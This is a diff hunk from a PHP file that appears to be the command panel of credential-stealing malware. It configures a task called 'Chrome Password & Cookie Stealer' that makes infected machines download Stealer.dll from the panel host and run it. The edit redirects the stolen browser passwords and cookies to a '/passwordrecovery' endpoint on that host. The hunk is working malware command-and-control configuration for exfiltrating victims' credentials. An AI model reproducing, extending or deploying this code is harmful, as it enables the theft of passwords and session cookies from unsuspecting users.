@@ -21,5 +21,5 @@ $host = "http://".$_SERVER["HTTP_HOST"];
 $GLOBALS["task_configuration"]["stealer"] = array(
     "name" => "Chrome Password & Cookie Stealer",
     "command" => "runplugin",
-    "value" => $host."/versions/".$GLOBALS["loadedVersion"]."/plugins/stealer/dll/Stealer.dll;runstealer;".$host
+    "value" => $host."/versions/".$GLOBALS["loadedVersion"]."/plugins/stealer/dll/Stealer.dll;runstealer;".$host."/passwordrecovery"
 );
